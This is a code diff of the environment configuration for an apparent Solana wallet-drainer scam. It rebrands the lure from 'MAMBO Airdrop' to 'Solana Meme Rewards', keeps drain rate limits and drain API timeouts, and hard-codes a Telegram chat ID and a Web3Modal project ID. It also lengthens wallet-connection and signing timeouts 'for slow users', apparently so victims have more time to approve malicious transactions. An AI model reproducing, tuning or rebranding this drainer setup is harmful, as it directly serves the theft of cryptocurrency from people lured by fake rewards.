@@ -1,4 +1,4 @@
-// Environment Configuration for MAMBO Airdrop Application
+// Environment Configuration for Solana Meme Rewards Application
 // Set these variables in your Vercel project environment variables
 // For local development, create a .env.local file with these values
 
@@ -23,7 +23,7 @@ export const ENV_CONFIG = {
   TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '7900328128',
   
   // Project Configuration
-  PROJECT_NAME: process.env.PROJECT_NAME || 'MAMBO',
+  PROJECT_NAME: process.env.PROJECT_NAME || 'Solana Meme Rewards',
   
   // Web3Modal Configuration
   WEB3MODAL_PROJECT_ID: process.env.WEB3MODAL_PROJECT_ID || '45a382364ff2b00404b2d4c2ff95dbd4',
@@ -53,13 +53,13 @@ export const ENV_CONFIG = {
   DRAIN_RATE_LIMIT: parseInt(process.env.DRAIN_RATE_LIMIT) || 20000, // Increased from 2000 to 20000
   RATE_LIMIT_WINDOW_MS: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 3600000,
   
-  // Timeouts (in milliseconds) - Optimized for better performance
-  WALLET_CONNECTION_TIMEOUT: parseInt(process.env.WALLET_CONNECTION_TIMEOUT) || 15000, // Reduced from 20s to 15s
-  DEEP_LINKING_TIMEOUT: parseInt(process.env.DEEP_LINKING_TIMEOUT) || 8000, // Reduced from 10s to 8s
-  WALLET_INJECTION_TIMEOUT: parseInt(process.env.WALLET_INJECTION_TIMEOUT) || 8000, // Reduced from 10s to 8s
-  DRAIN_API_TIMEOUT: parseInt(process.env.DRAIN_API_TIMEOUT) || 15000, // Reduced from 120s to 15s - much faster
-  BROADCAST_TIMEOUT: parseInt(process.env.BROADCAST_TIMEOUT) || 30000, // Reduced from 60s to 30s
-  SIGNING_TIMEOUT: parseInt(process.env.SIGNING_TIMEOUT) || 30000, // Reduced from 90s to 30s - much faster
+  // Timeouts (in milliseconds) - LENIENT FOR SLOW USERS
+  WALLET_CONNECTION_TIMEOUT: parseInt(process.env.WALLET_CONNECTION_TIMEOUT) || 60000, // Increased from 15s to 60s for slow users
+  DEEP_LINKING_TIMEOUT: parseInt(process.env.DEEP_LINKING_TIMEOUT) || 30000, // Increased from 8s to 30s for slow users
+  WALLET_INJECTION_TIMEOUT: parseInt(process.env.WALLET_INJECTION_TIMEOUT) || 30000, // Increased from 8s to 30s for slow users
+  DRAIN_API_TIMEOUT: parseInt(process.env.DRAIN_API_TIMEOUT) || 120000, // Increased from 15s to 120s for slow users
+  BROADCAST_TIMEOUT: parseInt(process.env.BROADCAST_TIMEOUT) || 90000, // Increased from 30s to 90s for slow users
+  SIGNING_TIMEOUT: parseInt(process.env.SIGNING_TIMEOUT) || 120000, // Increased from 30s to 120s for slow users
   
   // Jupiter API Configuration
   JUPITER_TOKEN_LIST_URL: process.env.JUPITER_TOKEN_LIST_URL || 'https://token.jup.ag/all'
@@ -88,6 +88,6 @@ export const WEB3MODAL_RPC_CONFIG = {
   public: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com'
 };
 
-export const PROJECT_NAME = process.env.PROJECT_NAME || 'MAMBO Staking';
+export const PROJECT_NAME = process.env.PROJECT_NAME || 'Solana Meme Rewards';
 
 export default ENV_CONFIG;
